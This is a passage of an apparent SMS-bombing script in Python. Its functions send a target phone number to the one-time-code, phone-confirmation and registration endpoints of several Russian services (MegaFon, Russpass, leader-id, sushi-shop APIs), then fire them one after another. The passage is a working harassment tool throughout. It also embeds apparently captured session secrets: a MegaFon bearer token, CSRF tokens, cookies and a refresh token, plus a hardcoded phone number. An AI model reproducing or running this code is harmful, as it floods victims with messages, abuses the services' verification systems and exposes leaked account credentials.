            'sec-ch-ua': '"Not?A_Brand";v="8", "Chromium";v="108", "Yandex";v="23"',
            'sec-ch-ua-mobile': '?0',
            'sec-ch-ua-platform': '"Windows"',
            'sec-fetch-dest': 'empty',
            'sec-fetch-mode': 'cors',
            'sec-fetch-site': 'same-origin',
            'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.0.0 Safari/537.36',
        }

        json_data = {
            'phone': PHONE,
        }

        response = requests.post('https://leader-id.ru/api/v4/auth/start-phone-confirm', cookies=cookies, headers=headers, json=json_data)
        print(f"serv12 - {response.status_code}")
    except:
        print("serv12 - error")
def serv13():
    try:
        headers = {
            'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64; rv:140.0) Gecko/20100101 Firefox/140.0',
            'Accept': 'application/json, text/plain, */*',
            'Accept-Language': 'en-US,en;q=0.5',
            # 'Accept-Encoding': 'gzip, deflate, br, zstd',
            'Referer': 'https://lk.megafon.ru/login',
            'Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8',
            'X-App-Type': 'react_lk',
            'X-Cabinet-Id-Param': '2b9fb9a1-8681-4efa-ba2c-90de3580d2f5',
            'X-Cabinet-Check-Info': 'c2491241-ab6e-46df-a9f0-346ef5078f7a',
            'X-Cabinet-Validation-Param': '6007dce3-ac40-42cd-95ad-67bd0f4be90d',
            'X-Cabinet-Authorization': 'Bearer eyJ0eXAiOiJKV1QiLCJhbGciOiJFUzI1NiJ9.eyJzdWJzY3JpYmVyWm9uZUlkIjo0NywiYXV0aENoYW5uZWwiOiJPVFAiLCJtYWNyb1JlZ2lvbklkIjo1MDAsIm11bHRpYWNjb3VudFNlc3Npb25UeXBlIjoiTUFTVEVSIiwib3BlckNvZGUiOjUwMCwib3BlcktleSI6IlZPTEdBIiwiaXNzIjoiYXV0aC1zZXJ2ZXIiLCJiaWxsaW5nU2VjdXJpdHlSb2xlIjoiQklMTElOR19BQ0NPVU5UX09XTkVSIiwibWFzdGVyTXNpc2RuIjoiOTM3NDkwMzUzOSIsImN1c3RvbWVySWQiOiIxMzEwMzU1ODIiLCJwc3NvVG9rZW4iOiJleUpyYVdRaU9pSnFkM05mYVdSZmRHOXJaVzRpTENKaGJHY2lPaUpTVXpJMU5pSjkuZXlKemRXSWlPaUl4T1RrNU1UQXdPVFl3T0RRM01qWWlMQ0poY0hCc1gyTnZaR1VpT2lKTlJpMU1TeTFFU1ZJaUxDSmhkWFJvWDNSNWNHVWlPaUpzYjJkcGJpSXNJbUYxZEdoZmJHVjJaV3dpT2pFd01Dd2laR1Z3WVhKMGJXVnVkRjlwWkNJNk9UazVMQ0poY0hCc1gzUjVjR1VpT2lKVFF5SXNJbWx6Y3lJNkltaDBkSEJ6T2k4dmJtVjRhV2R1TG1OdmJTSXNJbk5sYzNOcGIyNWZhV1FpT2lKdllYTXRNREUyWkRSbE5HWXRPVFEyWWkwME9EUXpMVGczTWpBdE5HUTROekZpWVRoaU1qQmhJaXdpY0hKbFptVnljbVZrWDNWelpYSnVZVzFsSWpvaU9UTTNORGt3TXpVek9TSXNJbXh2WTJGc1pTSTZJbkoxSWl3aVlXTnNYMmhoYzJnaU9pSTNaVFkwTWpObU1XTm1aRGczWkdWbFlqTmpNV0ZoTURFNFl6aG1Oemt4TjJabU0ySmpZVEprTnpkbVltSmxNak13TVdGbU1qUXhPR1JrTm1NeFpHRmtJaXdpWVhCd2JGOXBaQ0k2SWsxR0xVeExMVVJKVWlJc0luVnpaWEpmZEhsd1pWOXBaQ0k2TWpVd016QXdNREF5TENKbGVIQWlPakUzTnpJM09EWXdORFlzSW1saGRDSTZNVGMzTWpjNE1qUTBOaXdpYW5ScElqb2lZUzAxWlRZMU5qVmlNQzFqT0RZNExUUXlObVV0T0RnNE5pMWtOek0yT0Rrd05qSmhNREFpZlEuV1JaUHNMMVlHcFFYejQ4dVhYbTdFNG5raFZVdEROc19FQTlfSjVicTRadHRuY3FUbk11c1RtX29mbWsyd0FVeTlZZnlLU3FhMXNZTVlwdFhXUTlZRzRHelF6TDMxMHRMaHdMUVVfbHVLb01QR09CV2hQN1Vfb3hsazRZMUp2ai04NjBPY3BGS2lHc2FQaFFKTmJjRzRnSnVrNWhZVkowNEM5VFVsY2pTbXBtNXhIc3Qzal9XR2ZFZDFTb01KZERNeUNfMXlUdkxidGtuVk9YYWZLaXotMzktNkNvd3B3ekpnNUcyNTh5aW5oYWlEckJaWHNqeW1Hc0FVb1J2RFNJRlBjNnM1eEtGRTdwVHlfVlFTOEZVRDhfZjVXZzYzdUMyaVYyNi1XUGZxdHBKdGY3OWNJYUV5WERDUWViRjJ4QnVNVm9ZRFdaRVpYXzhmLXkzTkxSNU93IiwiY2xpZW50IjoiTUYtTEstRElSIiwiZXhwIjoxNzcyNzgzNjQ3LCJtc2lzZG4iOiI5Mzc0OTAzNTM5IiwiaWF0IjoxNzcyNzgyNDQ3LCJqdGkiOiI4OWMxMmVlZi0xYjk3LTRjZmItODIyOS1hMGQ0Njg1M2MxYjkiLCJicmFuY2hJZCI6MzIsInN1YnNjcmliZXJJZCI6IjEyMTc3MjUyMiIsInRpbWVab25lIjoiQXNpYS9ZZWthdGVyaW5idXJnIiwiY3VzdG9tZXJEYXRhYmFzZUlkIjo5OTksInBzU3NvQWNjb3VudFR5cGUiOiJHRU5FUkFMX0RJUkVDVCIsInN1YnNlZ21lbnQiOiJCMkMiLCJjdXN0b21lck51bWJlclR5cGUiOiJSRUFMX05VTUJFUiIsImNhbGxDZW50ZXJJbXBlcnNvbmF0b3IiOm51bGwsImxrU2VjdXJpdHlSb2xlIjoiQVVUSE9SSVNFRF9aT05FX1VTRVIifQ.0SuW2fLcJ4-jtFgnxFRcFYuQq95tmqDhIl6Y0nId17cNN_vutKpQFso7OoREF93M0tNrQqgWywmlVdsNkaoxzA',
            'X-CSRF-TOKEN': '20db51b8-26c1-4635-863f-7521ec522cbb',
            'Origin': 'https://lk.megafon.ru',
            'Connection': 'keep-alive',
            # 'Cookie': 'DEVICE-ID=9b2494b6-9bcb-4e54-92e4-aa8794f77495; _ym_uid=1772782435291601158; _ym_d=1772782435; X-Cabinet-Refresh-Token=d5725991-1381-4792-8f0e-065a109ae073; NEW-CSRF-TOKEN=20db51b8-26c1-4635-863f-7521ec522cbb; csrf-token=20db51b8-26c1-4635-863f-7521ec522cbb; JSESSIONID=0a0cb8b2-53f1-49e5-9614-b56922cebf90; _ym_isad=2',
            'Sec-Fetch-Dest': 'empty',
            'Sec-Fetch-Mode': 'cors',
            'Sec-Fetch-Site': 'same-site',
            'Priority': 'u=0',
            # Requests doesn't support trailers
            # 'TE': 'trailers',
        }
        data = {
            'login': '79374903532',
            'captchaReady': 'true',
        }
        response = requests.post('https://api.megafon.ru/mlk/api/auth/otp/request', headers=headers, data=data)
        print(f"serv13 - {response.status_code}")
    except:
        print("serv13 - error")
def serv14():
    try:
        headers = {
            'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64; rv:140.0) Gecko/20100101 Firefox/140.0',
            'Accept': 'application/json',
            'Accept-Language': 'en-US,en;q=0.5',
            # 'Accept-Encoding': 'gzip, deflate, br, zstd',
            'Referer': 'https://russpass.ru/',
            'X-Platform-Version': 'web 3.0.0',
            'is-logged-in': 'false',
            'rqid': '6f32245c-b1d9-42f7-9132-7515e1263b77',
            'Content-Type': 'application/json',
            'secure-code': 'fb3bb33a-905d-4995-b4d3-a433eda2f205',
            'Origin': 'https://russpass.ru',
            'Connection': 'keep-alive',
            'Sec-Fetch-Dest': 'empty',
            'Sec-Fetch-Mode': 'cors',
            'Sec-Fetch-Site': 'same-site',
            'Priority': 'u=0',
            # Requests doesn't support trailers
            # 'TE': 'trailers',
        }

        params = {
            'language': 'ru',
        }

        json_data = {
            'login': PHONE,
        }

        response = requests.post('https://api.russpass.ru/user/v2/verify', params=params, headers=headers, json=json_data)
        print(f"serv14 - {response.status_code}")
    except:
        print("serv14 - error")
def serv15():
    try:
        headers = {
            'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64; rv:140.0) Gecko/20100101 Firefox/140.0',
            'Accept': '*/*',
            'Accept-Language': 'en-US,en;q=0.5',
            # 'Accept-Encoding': 'gzip, deflate, br, zstd',
            'Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8',
            'X-Requested-With': 'XMLHttpRequest',
            'Origin': 'https://banzai-sushi.ru',
            'Connection': 'keep-alive',
            'Referer': 'https://banzai-sushi.ru/sety',
            # 'Cookie': 'PHPSESSID=g19arn3lbgg7ksn2nc7kjr8o22; language=ru-ru; currency=RUB; promodate=20260408; display=list; _ga=GA1.2.1263868573.1775667122; _gid=GA1.2.1527243538.1775667122; _gat_UA-89928663-1=1; _ym_uid=1775667122324564224; _ym_d=1775667122; _ym_isad=2; _ym_visorc=w; _ga_W4GHH62KZ3=GS2.2.s1775667122$o1$g0$t1775667122$j60$l0$h0',
            'Sec-Fetch-Dest': 'empty',
            'Sec-Fetch-Mode': 'cors',
            'Sec-Fetch-Site': 'same-origin',
            'Priority': 'u=0',
        }

        data = {
            'reg_phone_number': f'+{PHONE}',
            'reg_name': 'Алексей',
            'reg_birthday': '2002-04-04',
            '': '2002',
            'reg_gender': '1',
            'reg_region': '1',
            'reg_politic': '1',
            'registration_btn': 'Зарегистрироваться',
        }

        response = requests.post('https://banzai-sushi.ru/?route=api/registration', headers=headers, data=data)
        print(f"serv15 - {response.status_code}")
    except:
        print("serv15 - error")
def serv16():
    try:
        headers = {
            'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64; rv:140.0) Gecko/20100101 Firefox/140.0',
            'Accept': 'application/json',
            'Accept-Language': 'en-US,en;q=0.5',
            # 'Accept-Encoding': 'gzip, deflate, br, zstd',
            'Content-Type': 'application/json;charset=utf-8',
            'X-Store-Id': '940eecaf-59d8-46d6-b73d-319cfc5a3d4c',
            'X-Timezone': 'America/Chicago',
            'X-Zenky-Client': 'web',
            'X-Zenky-Version': '2.135.2',
            'Origin': 'https://sushihouse39.ru',
            'Connection': 'keep-alive',
            'Referer': 'https://sushihouse39.ru/',
            'Sec-Fetch-Dest': 'empty',
            'Sec-Fetch-Mode': 'cors',
            'Sec-Fetch-Site': 'cross-site',
            # Requests doesn't support trailers
            # 'TE': 'trailers',
        }

        json_data = {
            'phone': f'+{PHONE}',
            'phone_country': 'RU',
            'password': 'qwerty123',
        }

        response = requests.post('https://api.zenky.io/v2/auth/register', headers=headers, json=json_data)
        print(f"serv16 - {response.status_code}")
    except:
        print(f"serv16 - error")
serv2()
serv3()
serv4()
serv5()
serv6()
serv7()
serv8()
serv9()
serv10()
serv11()
serv12()
serv13()
serv15()
serv16()